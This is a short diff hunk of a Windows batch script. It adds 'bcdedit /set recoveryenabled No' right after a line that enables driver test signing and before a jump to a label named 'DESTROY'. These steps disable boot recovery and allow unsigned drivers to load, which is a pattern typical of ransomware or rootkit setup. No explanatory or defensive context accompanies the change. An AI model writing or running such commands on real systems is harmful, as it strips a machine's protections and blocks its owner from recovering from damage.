@@ -231,6 +231,7 @@ goto AAAAJJ
 goto ADDONS
 :BCD
 bcdedit /set TESTSIGNING on
+bcdedit /set recoveryenabled No
 goto DESTROY
 :ADDONS
 @rem --Additional Commands go below--
